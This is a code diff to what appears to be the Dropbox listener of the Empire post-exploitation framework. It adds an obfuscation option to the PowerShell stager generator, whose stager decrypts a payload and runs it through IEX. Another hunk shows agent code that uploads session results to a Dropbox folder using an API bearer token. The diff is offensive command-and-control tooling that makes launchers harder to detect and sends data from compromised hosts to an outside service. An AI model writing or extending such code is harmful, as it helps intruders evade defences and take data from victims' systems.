@@ -146,7 +146,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -251,8 +251,10 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                if obfuscate:
+                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode:
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -606,7 +608,7 @@ class Listener:
                 if($Script:Proxy) {
                     $wc2.Proxy = $Script:Proxy;
                 }
-                
+
                 $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
                 $wc2.Headers.Add("Content-Type", "application/octet-stream")
                 $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
